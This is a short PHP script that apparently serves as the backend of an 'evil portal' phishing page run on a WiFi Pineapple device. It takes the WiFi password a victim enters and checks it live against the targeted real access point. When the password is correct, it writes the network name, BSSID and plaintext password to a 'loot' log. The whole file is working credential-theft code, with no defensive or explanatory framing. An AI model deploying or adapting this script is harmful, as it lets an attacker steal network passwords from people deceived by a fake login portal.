<?php

if (
    $_SERVER['REQUEST_METHOD'] === 'POST' and 
    isset($_POST['password']) and 
    !empty($_POST['password']) and
    strlen($_POST['password']) >= 8
) {

    require_once('./classes/API.php');
    include_once('./configuration.php');
    
    if (API::login($MK7_USERNAME, $MK7_PASSWORD)) {
        foreach (API::scan() as $access_point) {
            if (
                $access_point['ssid'] === $AP_SSID and 
                $access_point['bssid'] === $AP_BSSID
            ) {
                $password = (string) $_POST['password'];
                if (API::connect($access_point, $password)) {
                    $loot = fopen('./logs/evil-portal.log', 'a');
                    fwrite($loot, "##\n");
                    fwrite($loot, $AP_SSID . "\n");
                    fwrite($loot, $AP_BSSID . "\n");
                    fwrite($loot, $password . "\n");
                    fwrite($loot, "##\n");
                    fclose($loot);
                    echo '{"update":true}';
                } else {
                    echo '{"update":false}';
                }
                API::disconnect();
                exit();
            }
        }
        echo '{"update":false}';
    }

}

?>
